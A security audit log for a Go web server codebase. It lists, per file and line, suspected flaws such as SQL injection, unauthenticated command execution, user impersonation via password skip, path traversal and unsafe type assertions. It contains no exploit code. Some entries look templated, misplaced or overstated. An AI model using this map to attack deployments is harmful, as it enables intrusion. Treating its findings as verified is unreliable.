# Issues Found During Source Code Analysis

**Purpose:** Track all potential bugs, security issues, and code problems discovered during systematic source code analysis.

---

## server/dbresourceinterface/ folder

### Critical Issues
- **Line 4 in credential.go:** Unsafe Interface{} Type in Credential DataMap - untyped credential data storage allowing arbitrary content, potential for deserialization attacks
- **Lines 15-26 in interface.go:** No Input Validation Contracts in Interface - interface methods lack input validation specifications, could lead to inconsistent security validation

### High Risk Issues
- **Line 17 in interface.go:** Permission Interface Without Authorization Context - permission retrieval without user authorization context, potential privilege escalation
- **Line 23 in interface.go:** Credential Retrieval Without Access Control - credential access without authorization validation, could allow unauthorized credential retrieval
- **Line 19 in interface.go:** Admin Email Exposure - administrative email information exposed without access control
- **Line 22 in interface.go:** Action Handler Access Without Validation - action handler retrieval without authorization, potential for unauthorized action execution

### Security Concerns
- **Authorization bypass:** Multiple operations lack user context for validation
- **Credential security:** Untyped credential storage with no access control
- **Interface security:** No validation contracts specified for implementations

---

## server/auth/auth.go

### Critical Issues
- **Lines 171, 208, 301-302, 376, 387:** Unsafe Type Assertions Without Error Handling - type assertions can panic if types don't match, could crash authentication middleware with malformed tokens
- **Lines 166-175:** Basic Authentication Password Exposure - basic authentication credentials handled insecurely, password stored in plain string variable
- **Lines 67-70:** Weak Default Permissions - DEFAULT_PERMISSION_WHEN_NO_ADMIN grants full CRUD access to guests, could enable privilege escalation
- **Lines 112-142:** Global JWT Secret Exposure - single global secret for all JWT operations without rotation, could compromise all tokens if exposed

### High Risk Issues
- **Lines 356-401:** Automatic User Creation Without Validation - users automatically created for unknown emails without proper validation, could enable account creation attacks
- **Lines 462-466:** Cache Without Expiration Validation - user session caching without proper expiration validation, cached sessions could persist after authorization changes
- **Lines 214, 354, 372, 385:** Information Disclosure Through Error Logging - user emails and system errors logged, could reveal system internals
- **Lines 520-602:** Binary Serialization Without Validation - binary serialization without comprehensive validation, could be exploited for memory corruption

### Security Concerns
- **Authentication bypass:** Multiple type assertion vulnerabilities could crash authentication system
- **Permission escalation:** Overly permissive default permissions enable privilege escalation
- **Session security:** Cache persistence issues and automatic user creation vulnerabilities

---

## server/jwt/jwtmiddleware.go

### Critical Issues
- **Lines 5, 170-178:** MD5 Hash Usage for Security Operations - MD5 cryptographic hash algorithm is cryptographically broken, vulnerable to collision attacks
- **Lines 242, 280, 330:** Unsafe Type Assertions Without Error Handling - type assertions can panic if types don't match, could crash JWT middleware with malformed tokens
- **Lines 100, 207, 262, etc.:** Token Logging in Debug Mode - JWT tokens logged in debug mode exposing sensitive authentication data in plaintext logs
- **Line 294:** Insecure Token Cache Key Generation - full JWT token used directly as cache key without hashing, could expose tokens through cache inspection

### High Risk Issues
- **Lines 190-201, 264-271:** Commented Token Caching Code with Security Implications - shows previous insecure implementation using MD5, could be uncommented accidentally
- **Lines 352-355:** Cache Operations Without Error Validation - token caching without proper error handling, inconsistent authentication behavior if caching fails
- **Lines 296-301:** Token Cache Scanning Without Validation - cache data deserialization without validation, potential for cache poisoning attacks
- **Lines 242-244, 330-332:** Missing Issuer Validation Error Context - issuer validation error references wrong token field, misleading security error reporting

### Security Concerns
- **Cryptographic weakness:** MD5 hash usage enables collision attacks and cache poisoning
- **Token exposure:** JWT tokens logged and used as cache keys exposing sensitive authentication data
- **Authentication bypass:** Cache vulnerabilities could enable token reuse and replay attacks

---

## server/fsm/fsm_manager.go

### Critical Issues
- **Lines 62-69, 151:** Unsafe Type Assertions Without Error Handling - type assertions can panic if types don't match, could crash application with malformed data
- **Lines 31-34, 188-189:** SQL Injection Through String Concatenation - objType parameter used directly in SQL query construction without validation, could execute arbitrary SQL commands

### High Risk Issues
- **Line 130:** JSON Unmarshaling Without Validation - no validation of JSON content before unmarshaling, could trigger memory exhaustion with large JSON
- **Lines 149-185:** No Authentication Context in State Operations - state transitions without user authentication context, could allow unauthorized state transitions
- **Lines 156, 161, 180-182:** Information Disclosure Through Error Messages - object IDs and state information exposed in error messages and logs

### Security Concerns
- **State manipulation:** No authorization checks for state transitions
- **Race conditions:** No atomic operations for state transitions
- **Resource exhaustion:** No limits on state machine complexity

---

## server/hostswitch/ folder

### Critical Issues
- **Lines 69, 98 in host_switch.go:** Unsafe Type Assertion Without Error Handling - type assertion can panic if userI is not the expected type, could crash application with malformed context data
- **Line 44 in utils.go:** Unsafe Variadic Function with Type Assertion - type assertion on variadic arguments without validation, could crash application with malformed arguments

### High Risk Issues
- **Lines 50, 130 in host_switch.go, Line 50 in utils.go:** Information Disclosure Through Error Logging - error details could reveal system internals and routing information
- **Lines 87-115 in host_switch.go:** Authentication Bypass Through Path Manipulation - URL path modification without proper validation could access protected resources
- **Line 42 in host_switch.go:** Host Header Injection Vulnerability - Host header used directly for routing decisions without validation

### Security Concerns
- **Race conditions:** Concurrent access to maps without synchronization
- **Default routing:** Dashboard handler used as default without permission verification
- **Path manipulation:** No validation of modified path components

---

## server/id/id.go

### Critical Issues
- **Lines 36-37, 45:** Unsafe Pointer Usage in JSON Encoding - direct unsafe pointer manipulation without validation, could access invalid memory locations and cause memory corruption
- **Lines 27, 115, 125:** Information Disclosure Through Error Messages - input values logged in error messages, could expose sensitive IDs or system internals

### High Risk Issues
- **Lines 82-89:** No Input Validation in Binary Unmarshaling - binary data processed without content validation, could accept malicious binary data
- **Lines 97-130:** Type Conversion Without Error Handling - multiple type conversions without comprehensive error handling, could return invalid reference IDs
- **Lines 59-75:** String Parsing Without Comprehensive Validation - basic quote removal without proper JSON parsing, potential for JSON injection attacks

### Security Concerns
- **Memory safety:** Use of unsafe pointers without proper validation
- **Silent failures:** Errors ignored in critical UUID operations
- **Global state:** Shared global variable without synchronization protection

---

## server/subsite/ folder

### Critical Issues
- **Multiple files:** Unsafe Type Assertions Without Error Handling - type assertions can panic if types don't match, could crash application with malformed data
- **Lines 13-17 in subsite_staticfs_server.go:** Path Traversal Vulnerability in Static File Server - no validation of file paths before opening, could access files outside intended directory
- **Lines 15-21 in get_all_subsites.go:** SQL Injection Through Dynamic Query Construction - string concatenation in SQL query construction without validation

### High Risk Issues
- **Multiple files:** JSON Unmarshaling Without Validation - no validation of JSON content before unmarshaling, could trigger memory exhaustion
- **Multiple files:** Information Disclosure Through Error Logging - database error details and system internals exposed in logs
- **Lines 52-88 in template_handler.go:** Cache Key Predictability and Injection - URL path and query parameters directly in cache keys without validation
- **Lines 253-265 in template_handler.go:** Template Injection Through Action Execution - user-controlled template actions executed without validation

### Security Concerns
- **Authentication bypass:** Missing authentication checks for template execution
- **Cache poisoning:** Predictable cache keys vulnerable to manipulation
- **Template injection:** Arbitrary template and action execution possible

---

## server/rootpojo/ folder

### Critical Issues
- **Lines 5-7 in data_import_file.go:** Information Disclosure Through String Method - file paths exposed in string representation could reveal system directory structure

### High Risk Issues
- **Line 12 in cloud_store.go:** Unsafe Interface{} Type in Store Parameters - untyped data structure allowing arbitrary content with no validation
- **Line 14 in cloud_store.go:** Credential Name Exposure - credential identifiers exposed in data structure could reveal authentication mechanisms
- **Line 10 in data_import_file.go:** Path Traversal Risk in File Import - no validation of file paths could allow directory traversal attacks

### Security Concerns
- **Information disclosure:** Sensitive file paths and credential names exposed
- **Type safety:** Unvalidated interface{} parameters allow arbitrary data
- **Path validation:** No sanitization of file paths and directories

---

## server/statementbuilder/statement_builder.go

### Critical Issues
- **Lines 12, 16:** Global Mutable State Without Protection - global variable modified without synchronization, race conditions during concurrent access could corrupt SQL query building
- **Lines 14-17:** Database Type Injection - no validation of database type parameter, could pass malicious or invalid types causing application crashes

### High Risk Issues
- **Lines 12, 16:** No Error Handling for Dialect Initialization - silent failures if dialect is not supported, could result in invalid query builder state

### Security Concerns
- **Thread safety:** Global state accessible and modifiable without protection
- **Input validation:** No validation against allowed database types
- **Configuration manipulation:** Could change database type during runtime

---

## server/actions/action_become_admin.go

### Critical Issues
- **Lines 33, 38:** Unsafe Type Assertion Without Error Handling - type assertions can panic if types don't match, could crash application during privilege escalation
- **Line 38:** Direct User ID Manipulation for Privilege Escalation - user ID taken directly from input without validation, could enable privilege escalation for arbitrary users
- **Lines 39-40, 48-49:** Transaction Mismanagement in Security-Critical Operation - transaction committed without proper error handling, could result in incomplete privilege escalation
- **Line 46:** Cache Destruction Without Error Handling - critical cache destruction operation without error handling, could leave system in inconsistent state

### High Risk Issues
- **Lines 26-28:** Weak Authorization Check - single authorization check for critical privilege operation, insufficient for administrative access
- **Lines 44, 52-55:** System Restart Triggered by User Action - user-initiated system restart capability, potential for denial of service attacks
- **Lines 27, 31:** Information Disclosure Through Error Messages - generic error messages could help attackers with enumeration

### Security Concerns
- **Privilege escalation:** Direct manipulation of user privileges without sufficient validation
- **System integrity:** Cache destruction and restart capabilities controlled by user action
- **Audit bypass:** No comprehensive audit trail for privilege changes

---

## server/actions/action_execute_process.go

### Critical Issues
- **Lines 34-37:** Arbitrary Command Execution Without Validation - direct execution of user-provided system commands, complete system compromise possible
- **Lines 34-35:** Unsafe Type Assertions Without Error Handling - type assertions can panic if types don't match, could crash application during command execution
- **Lines 34-37:** Command Injection Vulnerability - user controls both command name and arguments with no sanitization, system compromise through command injection
- **Lines 44-62:** Information Disclosure Through Command Output - all command output returned to user without filtering, could expose sensitive system data

### High Risk Issues
- **Lines 29-63:** No Authorization Checks - no access control for system command execution, any user can execute arbitrary commands
- **Lines 37-45:** Resource Exhaustion Through Process Execution - no limits on process execution or resource usage, potential denial of service
- **Lines 47-54:** Error Information Disclosure - detailed error information exposed to users, could reveal system paths and vulnerabilities

### Security Concerns
- **Remote Code Execution:** Complete arbitrary command execution capability represents highest security risk
- **System Compromise:** Full system access through command execution without any restrictions
- **Data Exfiltration:** Ability to access and steal any system data through commands

---

## server/actions/action_restart_system.go

### Critical Issues
- **Lines 21-41:** No Authorization Checks for System Restart - no access control for system restart functionality, any user can trigger restart procedures
- **Lines 17-19:** Hardcoded Administrative Action Name - predictable action name with double underscore prefix, easily discoverable by attackers

### High Risk Issues
- **Lines 25-30:** Misleading User Interface Messages - claims "Initiating system update" without actual implementation, could confuse users about system status
- **Lines 8-9, 21-41:** No Actual Restart Implementation - commented imports suggest removed restart functionality, incomplete critical system functionality
- **Lines 33-38:** User Redirection Without Validation - forces user redirection regardless of restart success, could be exploited for phishing

### Security Concerns
- **Administrative access:** No authorization validation for critical system operations
- **System integrity:** Incomplete implementation of system restart functionality
- **User interface security:** Misleading notifications about system state

---

## server/actions/action_switch_session_user.go

### Critical Issues
- **Lines 37-48:** Authentication Bypass Through Password Skip - user can set skipPasswordCheck to bypass password validation, enables arbitrary user impersonation
- **Lines 39, 44, 65:** Unsafe Type Assertions Without Error Handling - type assertions can panic if types don't match, could crash application during authentication
- **Lines 54-65:** User Impersonation Without Authorization - no authorization checks for user impersonation, any user can impersonate any other user
- **Lines 73-82:** JWT Token Generation Without Proper Validation - tokens generated without proper user validation, could create tokens for disabled accounts

### High Risk Issues
- **Lines 57-62, 120-125:** Information Disclosure Through Error Messages - error messages could aid in user enumeration and brute force attacks
- **Lines 132-140:** JWT Secret Not Initialized in Constructor - secret field not set during initialization, could result in weak JWT signatures
- **Lines 70-72:** Clock Skew Manipulation - 2-minute clock skew allows for time manipulation attacks and token validity extension

### Security Concerns
- **Authentication bypass:** Complete authentication system compromise through password skip functionality
- **User impersonation:** Unauthorized switching to any user session without proper validation
- **JWT security:** Weak token generation with compromised configuration

---

## server/task_scheduler/task_scheduler.go

### Design Issues
- **Lines 5-9:** Interface methods lack parameter validation specifications - implementations may have inconsistent security
- **Line 7:** AddTask method accepts task by value with no validation enforcement at interface level
- **Missing context support:** No context.Context parameters for cancellation or timeouts
- **No task management:** Missing methods for task identification, retrieval, or removal beyond addition

### Security Concerns  
- **Implementation freedom:** No validation contracts specified may lead to vulnerable implementations
- **Resource exhaustion potential:** No removal mechanism for accumulated tasks
- **Missing audit requirements:** No security or audit logging requirements specified

---

## server/websockets/web_socket_connection_handler.go

### Critical Issues
- **Lines 27, 38, 49, 75, 127, 170, 190, 191, 213:** Multiple unsafe type assertions can panic application - `topics, ok := message.Payload["topicName"].(string)` and similar patterns
- **Lines 78, 93:** Permission bypass vulnerability - default ALLOW_ALL_PERMISSIONS for non-table events bypasses security
- **Lines 55, 142:** Goroutine leak vulnerability - unlimited goroutine creation without lifecycle management
- **Lines 81-90:** Transaction resource leak - database transactions not properly cleaned up on errors
- **Lines 65, 69:** Unsafe binary and JSON unmarshaling without validation can cause code injection

### Security Issues
- **Lines 138, 185:** Topic management security - insufficient validation for topic creation/deletion operations
- **Lines 32-34, 214-216:** Missing input validation for WebSocket message parameters
- **Lines 132, 176, 193:** Race condition potential from concurrent access to shared maps without synchronization

### Resource Management Issues  
- **Resource exhaustion:** No limits on topics, subscriptions, or goroutines per connection
- **Memory leaks:** Abandoned goroutines and database connections under error conditions
- **Performance degradation:** Unlimited resource creation can cause system instability

---

## server/action_provider/action_provider.go

### Critical Issues
- **Lines 217-219:** Global Action Handler Map Registration without access control - action performers registered in global map without authentication, potential for action handler hijacking and privilege escalation
- **Lines 16-21:** Transaction Management Without Rollback - transaction always committed even if performer creation fails, could lead to database corruption through incomplete transaction handling
- **Lines 16, 197:** Unsafe CRUD Map Access - direct access to CRUD map without validation, could panic if CRUD map is empty or missing "world" key

### High Risk Issues  
- **Lines 197-214:** Dynamic Integration Loading Without Validation - integrations loaded and executed without security validation, sandboxing, or authenticity checks, potential for code injection through malicious integrations
- **Lines 26, 30, 34, 38, 42, 46, 50, 54, 58, 62, 66, 70, 74, 78, 82, 86, 90, 94, 98, 102, 106, 110, 118, 122, 126, 130, 134, 138, 142, 146, 150, 154, 158, 162, 166, 170, 174, 178, 182, 186, 190, 194, 206:** Extensive Error Logging with Information Disclosure - detailed error messages expose system internals, component names, and architecture
- **Lines 25, 129, 145, 149, 165:** Privileged Action Performers Without Access Control - admin privilege escalation, system restart, database modification, and command execution actions registered without authentication checks

### Security Concerns
- **Mass performer registration:** No validation of performer implementations before registration
- **External service dependencies:** Mail daemon and certificate manager dependencies without proper error handling
- **Integration security:** Dynamic integration loading could execute arbitrary code

---

## server/actionresponse/action_pojo.go

### Critical Issues
- **Lines 36-37, 43:** JavaScript Scripting in Action Conditions without sandboxing - user-provided JavaScript code executed in conditions with no sandboxing or validation, potential for code injection and arbitrary execution
- **Lines 12, 18, 44:** Unsafe Interface{} Type in Attributes - untyped data structures allowing arbitrary content with no validation or type safety, potential for deserialization vulnerabilities and type confusion attacks
- **Lines 19-20:** Raw Data Processing Without Validation - raw body data handled without validation or size limits, could be exploited for memory exhaustion and data validation bypass

### High Risk Issues
- **Lines 49-50:** Action Definition Storage in Database - action workflows stored in database without integrity checks, could allow action tampering through database access
- **Line 45:** Error Continuation Without Security Checks - actions continue execution despite errors, security failures might be ignored and could mask attack attempts
- **Lines 35-37:** Complex Chained Outcome Execution - outcome chaining with JavaScript evaluation could create complex attack chains with JavaScript access to all previous outcomes

### Security Concerns
- **JavaScript execution:** User-provided JavaScript in conditions executed without safety measures
- **Type safety:** Heavy use of interface{} reduces type safety and enables attacks
- **Transaction security:** Database transaction interface without user context or permission validation

---

## server/apiblueprint/apiblueprint.go

### Critical Issues
- **Lines 174, 179, 351, 356, 2814, 2843:** Hardcoded Credentials in Documentation Examples - default admin credentials and passwords exposed in API documentation examples, could be used for unauthorized access if defaults not changed
- **Lines 51, 111:** Unsafe Type Assertions with Interface{} - type assertions on user-provided data without safety checks, could be exploited for denial of service through application panics
- **Lines 156-332, 436-447:** Information Disclosure in API Documentation - extensive system information disclosure including internal architecture, authentication weaknesses, WebSocket security issues, and system limitations

### High Risk Issues
- **Lines 181-185, 2987:** Privileged Operation Documentation - admin privilege escalation operations documented with examples and conditions, could assist attackers in privilege escalation
- **Lines 19-32, 50-52:** Variadic Function Arguments Without Validation - unsafe argument handling in string formatting functions, potential for format string vulnerabilities and runtime errors
- **Lines 2872-2883, 2976-2994:** Authentication Flow Documentation - detailed OAuth and authentication implementation details exposed, could assist in authentication attacks

### Security Concerns
- **Information disclosure:** Extensive system details exposed in public API documentation
- **Credential exposure:** Hardcoded admin credentials visible in examples
- **Type safety:** Multiple unsafe type assertions throughout the codebase

---

## server/assetcachepojo/asset_cache.go

### Critical Issues
- **Lines 27, 47, 75-76, 147, 152, 207:** Path Traversal Vulnerability in File Operations - no validation of fileName or path components, could access files outside intended cache directory through relative path traversal
- **Lines 181, 204, 207:** Unsafe Type Assertions with Panic Potential - no validation before type assertions, could panic if data structure differs from expected, file upload functionality vulnerable to malformed input
- **Lines 227-228:** Panic on Directory Creation Failure - direct panic call on filesystem errors with no graceful error handling, denial of service through directory creation failures

### High Risk Issues
- **Lines 62-68:** Credential Injection in Configuration - credentials inserted into global rclone configuration without validation, could overwrite system configuration and pollute credentials across instances
- **Lines 195-198:** Base64 Decoding Without Size Limits - no size validation before decoding, could cause memory exhaustion on large payloads with silent failure
- **Lines 80, 112, 210, 225:** File Permissions and Directory Creation - os.ModePerm (0777) gives excessive permissions, could create security vulnerabilities in file access

### Security Concerns
- **Path traversal:** File operations vulnerable to directory traversal attacks
- **Type safety:** Multiple unsafe type assertions throughout file operations
- **Resource exhaustion:** No limits on file upload sizes or base64 decoding

---

## server/cache/ folder (utils.go, cached_file.go, file_cache.go)

### Critical Issues
- **Lines 160-167 (file_cache.go):** MD5 Hash Usage for ETag Generation - MD5 is cryptographically broken and vulnerable to collision attacks, potential for cache poisoning through hash collision attacks
- **Lines 119-221 (cached_file.go):** Buffer Overflow Risk in Binary Deserialization - no validation of data lengths during deserialization, could allocate massive amounts of memory and cause memory exhaustion
- **Lines 64, 73, 122 (file_cache.go):** Information Disclosure in Error Messages - detailed error messages exposing internal cache structure, cache keys, and operation details

### High Risk Issues
- **Lines 47-85, 303-315 (file_cache.go):** Race Condition in Cache State Management - race condition between close check and cache access, potential for accessing closed cache
- **Lines 6-52 (utils.go), 169-217 (file_cache.go):** Weak Input Validation for Content Type Detection - no validation of content type format, string matching could be bypassed with malformed input
- **Lines 34-115 (cached_file.go):** Unbounded Memory Allocation During Serialization - no limits on individual field sizes, could cause memory exhaustion through large cache entries

### Security Concerns
- **Hash security:** MD5 usage enables cache manipulation attacks
- **Memory safety:** Multiple vectors for memory exhaustion attacks
- **Information disclosure:** Internal cache details exposed through error messages

---

## server/cloud_store/ folder (cloud_store.go, utils.go)

### Critical Issues
- **Lines 33, 37, 65, 75, 76, 77 (cloud_store.go):** Unsafe Type Assertions with Panic Potential - database results assumed to be specific types without validation, could panic if database contains unexpected types
- **Lines 7, 23, 37 (utils.go):** Unsafe Type Assertions in Error Handling - error handling functions themselves can panic, string type assumed without validation in error reporting mechanisms
- **Lines 70-72 (cloud_store.go):** JSON Unmarshaling Without Validation - store parameters loaded from database without validation, could contain malicious JSON content with potential for JSON injection attacks

### High Risk Issues
- **Lines 29, 13, 43 (utils.go); Lines 38, 44, 71 (cloud_store.go):** Information Disclosure in Error Messages - detailed error messages exposing system internals, database content, store names and parameters
- **Line 32 (cloud_store.go):** Credential Name Exposure - credential names processed from database without validation, could reveal credential structure and enable credential enumeration
- **Lines 54, 61 (cloud_store.go):** Time Parsing Without Validation - time format errors silently ignored, could lead to incorrect timestamps and data integrity issues

### Security Concerns
- **Type safety:** Multiple unsafe type assertions throughout cloud storage configuration
- **JSON injection:** Unvalidated JSON processing from database parameters
- **Information disclosure:** Sensitive cloud storage details exposed through error messages

---

## server/columntypes/ folder (mtime.go, types.go)

### Critical Issues
- **Lines 372, 374, 381, 434, 443, 474, 505 (types.go):** Unsafe Type Assertions in Type Detection - multiple unsafe type assertions in critical type detection logic, could panic if unexpected types returned from helper functions
- **Lines 243-247 (types.go):** JSON Unmarshaling Without Validation - JSON unmarshaling of arbitrary user input without size limits or validation, potential for JSON injection attacks and memory exhaustion
- **Lines 338, 566, 569-574, 588-594 (types.go):** Regex Compilation Without Error Handling - MustCompile can panic on invalid regex patterns, user-provided regex patterns could cause ReDoS attacks

### High Risk Issues
- **Lines 162, 182, 207, 542, 571, 590, 696, 700, 705 (types.go):** Information Disclosure in Error Messages - detailed error messages exposing system internals, user input data, and internal type detection logic
- **Lines 104, 131, 142, 283, 312, 322 (mtime.go, types.go):** Fallback Time Values on Parse Failure - time.Now() returned on parsing failures exposes current system time and causes silent data corruption
- **Lines 114-123 (mtime.go):** Hardcoded Validation Logic in Date Processing - magic numbers for time validation tied to current system time, could fail in different configurations

### Security Concerns
- **Type safety:** Multiple unsafe type assertions in critical data processing functions
- **ReDoS attacks:** Unsafe regex patterns without complexity validation or timeouts
- **JSON injection:** Unvalidated JSON parsing of arbitrary user input

---

## server/resource/imap_user.go

### Critical Issues
- **Lines 61, 63, 65, 67, 69, 191, 196, 197, 198, 202, 204, 208, 210, 212, 268:** Extensive unsafe type assertions throughout mailbox processing - `box["name"].(string)`, `box["id"].(int64)`, `mailAccount["reference_id"].(string)` can panic if database contains unexpected types
- **Lines 37-38, 225-229, 296-300:** Database transaction management issues - transactions always committed using defer regardless of operation success, no rollback handling for failures

### High Risk Issues
- **Lines 93, 97, 107, 111, 120, 124, 133, 137, 146, 150, 159, 163, 254:** Information disclosure through detailed logging - usernames, mail account IDs, and database errors exposed in logs

---

## server/resource/resource_aggregate.go

### Critical Issues
- **Lines 158, 315:** SQL injection through dynamic table names - `req.RootEntity` and `joinTable` used directly in SQL construction without validation or sanitization
- **Lines 391, 404, 479, 486:** Unsafe type assertions without safety checks - `row[groupedColumn].(int64)` and `rightVal.(string)` can panic on unexpected types
- **Lines 184, 296:** UUID parsing with MustParse causing panics - `uuid.MustParse(rightValParts[1])` panics on invalid UUID strings

### High Risk Issues
- **Lines 187, 249, 285, 299:** Information disclosure through detailed error messages - database entity names, IDs, and internal structure exposed to attackers
- **Lines 139, 142, 149, 150:** Dynamic SQL expression building without validation - user input used directly in `goqu.L()` expressions allowing SQL injection
- **Lines 383-407:** Foreign key resolution without security checks - unauthorized data access through aggregation and foreign key traversal

### Medium Risk Issues
- **Lines 327-353:** Resource management with potential double-close - statement closed both in defer and explicitly causing resource management issues
- **Lines 165-201, 204-270:** Complex dynamic query construction with regex parsing - potential for bypass through malformed input and edge cases
- **Lines 325, 329:** Logging sensitive information - complete SQL queries and database details exposed in logs

---

## server/resource/resource_create.go

### Critical Issues
- **Lines 4, 242-244, 253-255, 175:** MD5 hash usage for cryptographic operations - cryptographically broken algorithm used for password hashing and file integrity
- **Lines 42, 47, 103, 105, 118, 147, 158, 160, 162, 214, 234, 243, 253, 424, 641, 644, 770, 820, 857:** Extensive unsafe type assertions throughout code - can panic on unexpected types causing DoS
- **Line 105:** UUID parsing with MustParse causing panics - `uuid.MustParse(s)` panics on invalid UUID strings from user input

### High Risk Issues
- **Lines 124, 130, 139, 683, 887:** Information disclosure through detailed error messages - database table names, foreign key relationships, and object IDs exposed
- **Line 172:** Base64 decoding without validation - `base64.StdEncoding.DecodeString(encodedPart)` ignores errors and could cause memory exhaustion
- **Lines 147-224:** File upload without size limits - unlimited file uploads could exhaust storage and memory resources

### Medium Risk Issues
- **Lines 128-143:** Foreign key resolution without rate limiting - multiple database queries for each reference could exhaust database resources
- **Lines 494-557, 597-957:** Complex business logic without validation - extensive relationship processing without comprehensive validation
- **Lines 90-100:** Default value processing without sanitization - default values used with simple string manipulation without validation

---

## server/resource/resource_delete.go

### Critical Issues
- **Line 479:** UUID parsing with MustParse causing panics - `uuid.MustParse(idString)` panics on invalid UUID strings from user input
- **Lines 75, 89, 103, 113, 434:** Unsafe type assertions without safety checks - multiple type assertions that can panic on unexpected database content

### High Risk Issues
- **Lines 47, 52, 68, 83, 91, 94, 108, 447, 452, 464, 468, 487, 539:** Information disclosure through detailed logging - table names, object IDs, SQL queries, and file paths exposed
- **Lines 103, 113:** File system path manipulation without validation - user-provided file paths used directly in deletion operations allowing potential directory traversal
- **Lines 95-117:** Cloud storage operations without proper error handling - file deletion errors logged but not handled, could lead to orphaned files

### Medium Risk Issues
- **Lines 121-428:** Commented out relationship deletion logic - critical relationship cleanup code disabled could lead to orphaned records and integrity issues
- **Lines 45-73:** Audit trail creation without error handling - failed audit creation doesn't prevent deletion affecting compliance
- **Lines 481-534, 537-576:** Database transaction complexity - complex transaction management with multiple rollback points could cause consistency issues

---

## server/resource/resource_findallpaginated.go

### Critical Issues
- **Lines 478, 486, 586, 618:** UUID parsing with MustParse causing panics - `uuid.MustParse()` calls on user query parameters can panic on invalid UUID strings
- **Lines 196, 220, 243, 1043, 1910, 1913, 1919, 1931:** Unsafe type assertions without safety checks - multiple type assertions that can panic on unexpected context or database content
- **Line 105:** MD5 hash usage for caching - cryptographically broken algorithm used for cache key generation allowing potential cache poisoning

### High Risk Issues
- **Lines 984-996, 1085, 1531, 1589, 1641, 1685:** SQL injection through dynamic query building - table names and user data embedded directly in SQL strings using string formatting
- **Lines 28, 39, 63, 75, 101, 122, 189, 228, 280, 449, 612, 630, 831, 1001, 1013, 1031, 1126, 1136, 1150, 1349, 1372, 1378:** Information disclosure through detailed logging - extensive logging of table names, query parameters, SQL queries, and system internals
- **Line 254:** Base64 decoding without validation - user-provided group parameters decoded without size limits or content validation

### Medium Risk Issues
- **Lines 939-997:** Complex permission logic without rate limiting - multiple database queries for permission validation could exhaust database resources
- **Lines 1466-1736:** Fuzzy search implementation complexity - 270 lines of complex logic with database-specific implementations and raw SQL construction
- **Lines 107-145:** Cache operations without authentication - cache operations lack proper user context and authentication validation

---

## server/resource/resource_findone.go

### Critical Issues
- **Lines 31, 83, 193, 198, 220, 254, 351, 356:** Unsafe type assertions without safety checks - multiple type assertions that can panic on unexpected context or database content
- **Lines 27-34, 216-223:** Special case authentication bypass - hardcoded "mine" string handling could allow authentication bypass through manipulation

### High Risk Issues
- **Lines 66, 147, 154, 170, 200, 239, 295, 313, 320, 334, 340, 358:** Information disclosure through detailed logging - model names, reference IDs, middleware details, and database errors exposed
- **Lines 111-116, 279-284:** Cache operations without user context - cache keys based only on model and reference ID without user authentication context
- **Lines 119-150, 286-316:** Translation data injection without validation - translation data directly merged into result object without comprehensive validation

### Medium Risk Issues
- **Lines 45-74, 104-107, 129-132, 168-181, 185-186:** Transaction management complexity - complex transaction handling with multiple rollback points could cause consistency issues
- **Lines 72-73, 243-244, 297-298, 334-341:** Error handling inconsistencies - different error patterns and rollback behaviors across similar failure scenarios
- **Lines 192-207, 350-365:** Include processing without bounds checking - unlimited include processing could be exploited for memory exhaustion
- **Lines 261-262:** Mailbox creation logic error - existence check uses wrong condition (> 1 instead of >= 1) could allow duplicate creation
- **Lines 184, 193, 227, 265, 297:** Database error exposure - errors returned directly to caller revealing internal details

### Medium Risk Issues
- **Lines 68, 91, 105, 118, 131, 144, 157, 211:** Hardcoded mailbox configuration values without flexibility
- **Lines 252, 294, 316, 345:** Missing input validation for mailbox name parameters in all CRUD operations
- **Lines 188, 262:** Inconsistent error handling patterns and generic error messages

---

## server/resource/mail_functions.go

### Critical Issues
- **Lines 89, 99, 131:** Unsafe type assertions without validation - `box[0]["id"]` used in SQL query construction can panic if database contains unexpected types
- **Lines 74-77, 94-107, 113-116, 136-138:** Database transaction management issues - transactions created without proper rollback handling, could lead to database inconsistency

### High Risk Issues
- **Lines 88-89, 99, 128-131, 145-151:** SQL query construction with potentially user-controlled data - mailbox names and IDs used without validation
- **Lines 16, 31, 46, 72, 111, 143:** Missing input validation for mail operation parameters in all functions
- **Lines 23, 38, 85, 125:** Database error exposure - errors and internal details passed through without sanitization

### Medium Risk Issues
- **Lines 57-62:** Hardcoded mailbox configuration values without flexibility
- **Lines 53:** Generic context usage without security validation
- **Lines 84-86, 124-126:** Missing transaction cleanup in error paths leading to resource leaks

---

## server/resource/middleware_datavalidation.go

### High Risk Issues
- **Lines 58, 61-66, 76-78:** Unsafe type assertions without validation - validation errors and column values cast without safety checks
- **Lines 63, 65-66, 89:** Information disclosure through error messages - validation details and column names exposed in HTTP responses
- **Lines 58, 81:** Validation tags processing without sanitization - validator and conform tags processed without security validation

### Medium Risk Issues
- **Lines 45-46, 96-102:** Missing input validation for middleware configuration - table configurations processed without validation
- **Lines 58:** Global validator instance usage without initialization verification
- **Lines 37-89:** HTTP method case sensitivity issues - method processing relies only on case normalization

---

## server/resource/middleware_eventgenerator.go

### Critical Issues
- **Lines 245, 258, 271:** Missing JSON import for marshal operations - `json.Marshal()` calls without importing JSON package, will cause compilation failure
- **Lines 245, 258, 271:** Unsafe array access without bounds checking - `results[0]` accessed without validating array length, can panic

### High Risk Issues
- **Lines 201-206:** Binary deserialization return error handling bug - returns error even on successful deserialization
- **Lines 52-62:** Environment variable processing without validation - pool sizes accepted without range validation
- **Lines 41-80:** Global state management without proper cleanup - worker pool without shutdown handling
- **Lines 103, 127, 247, 260, 273, 284, 305:** Information disclosure through detailed logging - event types and error details exposed

### Medium Risk Issues
- **Lines 147-231:** Binary buffer operations without size limits - could cause memory exhaustion
- **Lines 119-128:** Event queue overflow handling - events silently dropped under high load
- **Lines 112-128, 249-254, 262-267, 275-280:** Missing input validation in event publishing

---

## server/resource/middleware_exchangegenerator.go

### Critical Issues
- **Lines 42, 48, 51, 57, 84, 101, 105, 124, 156, 174, 179, 198:** Extensive unsafe type assertions throughout exchange processing - attributes and configurations cast without validation

### High Risk Issues
- **Lines 29-61, 94-133, 166-206:** Exchange configuration processing without validation - contracts accepted without verification
- **Lines 75, 98, 112, 117, 147, 170, 186, 191:** Information disclosure through detailed logging - exchange details and configurations exposed
- **Lines 115-132, 189-203:** Exchange execution without error validation - results processed without comprehensive validation

### Medium Risk Issues
- **Lines 30, 106, 180:** Array/slice operations without bounds checking - reverse iteration and array access without validation
- **Lines 122-130, 196-202:** Action context building with incorrect error handling logic - error condition used for success processing
- **Lines 25-61:** Exchange map management without concurrency protection

---

## server/resource/middleware_objectaccess_permission.go

### Critical Issues
